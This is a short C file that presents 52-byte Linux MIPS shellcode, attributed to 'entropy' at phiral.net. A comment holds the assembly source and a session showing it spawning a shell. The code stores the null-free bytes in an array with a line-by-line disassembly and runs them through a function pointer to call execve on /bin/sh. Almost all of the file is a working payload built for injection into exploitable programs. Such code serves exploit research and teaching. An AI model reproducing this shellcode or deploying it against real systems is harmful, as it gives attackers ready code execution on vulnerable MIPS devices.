#include <stdio.h>
/*

entropy [at] phiral.net
52 byte linux mips shellcode
oh werd

entropy@phiral.mips {~/encode/1/2} cat s.s
.section .text
.globl __start
.set noreorder
__start:
    li $a2, 0x666
p:  bltzal $a2, p
    slti $a2, $zero, -1
    addu $sp, $sp, -32
    addu $a0, $ra, 4097
    addu $a0, $a0, -4065
    sw $a0, -24($sp)
    sw $zero, -20($sp)
    addu $a1, $sp, -24
    li $v0, 4011
    syscall 0x40404
sc:
    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68

entropy@phiral.mips {~/encode/1/2} as s.s -o s.o
entropy@phiral.mips {~/encode/1/2} ld s.o -o s
entropy@phiral.mips {~/encode/1/2} ./s
$ exit

*/

char sc[] = {
    "\x24\x06\x06\x66" /* li a2,1638           */
    "\x04\xd0\xff\xff" /* bltzal a2,4100b4 <p> */
    "\x28\x06\xff\xff" /* slti a2,zero,-1      */
    "\x27\xbd\xff\xe0" /* addiu	sp,sp,-32      */
    "\x27\xe4\x10\x01" /* addiu	a0,ra,4097     */
    "\x24\x84\xf0\x1f" /* addiu	a0,a0,-4065    */
    "\xaf\xa4\xff\xe8" /* sw a0,-24(sp)        */
    "\xaf\xa0\xff\xec" /* sw zero,-20(sp)      */
    "\x27\xa5\xff\xe8" /* addiu	a1,sp,-24      */
    "\x24\x02\x0f\xab" /* li v0,4011           */
    "\x01\x01\x01\x0c" /* syscall 0x40404      */
    "/bin/sh"          /* sltiu	v0,k1,26990    */
                       /* sltiu	s3,k1,26624    */
};

void
main(void)
{
    void (*s)(void);
    printf("sc size %d\n", sizeof(sc));
    s = sc;
    s();
}